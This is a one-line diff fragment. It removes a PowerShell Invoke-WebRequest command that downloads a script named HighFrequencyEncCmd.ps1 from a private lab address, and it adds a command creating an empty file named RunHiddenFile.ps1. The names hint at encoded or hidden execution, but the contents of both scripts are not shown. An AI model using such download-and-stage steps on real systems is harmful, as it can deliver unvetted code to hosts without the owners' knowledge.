@@ -1,1 +1,1 @@
-Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.10.56:8080/HighFrequencyEncCmd.ps1" -OutFile "highfrequencyEncCmd.ps1
+touch RunHiddenFile.ps1
